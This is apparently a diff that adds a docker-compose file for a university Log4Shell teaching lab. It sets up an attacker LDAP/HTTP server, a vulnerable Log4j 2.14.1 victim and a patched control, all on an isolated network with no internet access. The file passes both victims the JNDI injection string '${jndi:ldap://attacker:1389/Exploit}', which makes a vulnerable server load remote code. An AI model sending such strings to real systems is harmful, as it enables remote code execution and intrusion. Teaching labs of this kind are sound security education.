@@ -1,0 +1,49 @@
+# SC3010 Log4Shell teaching lab.
+#
+# Three services on a single user-defined bridge network marked `internal: true`
+# so NOTHING in this lab can reach the internet at runtime. The victims resolve
+# the hostname `attacker` via Docker's built-in compose DNS.
+#
+#   attacker        -- LDAP referral server (:1389) + HTTP codebase (:8000)
+#   victim          -- the app built on Log4j 2.14.1 (VULNERABLE)
+#   victim-patched  -- the SAME app built on Log4j 2.17.1 (control)
+#
+# The malicious input string handed to the victims is:
+#   ${jndi:ldap://attacker:1389/Exploit}
+
+services:
+  attacker:
+    build: ./attacker
+    image: sc3010-attacker
+    container_name: sc3010-attacker
+    networks:
+      - labnet
+
+  victim:
+    build: ./vulnerable-app
+    image: sc3010-victim
+    container_name: sc3010-victim
+    depends_on:
+      - attacker
+    networks:
+      - labnet
+    # The attacker-controlled input. Logging this string is all it takes.
+    # NOTE: `$$` escapes compose variable interpolation so the container
+    # actually receives the literal string `${jndi:ldap://attacker:1389/Exploit}`.
+    command: ["$${jndi:ldap://attacker:1389/Exploit}"]
+
+  victim-patched:
+    build: ./patched-app
+    image: sc3010-victim-patched
+    container_name: sc3010-victim-patched
+    depends_on:
+      - attacker
+    networks:
+      - labnet
+    # Exactly the same input as the vulnerable victim (`$$` escaping again).
+    command: ["$${jndi:ldap://attacker:1389/Exploit}"]
+
+networks:
+  labnet:
+    driver: bridge
+    internal: true        # <-- no internet egress at runtime for any service
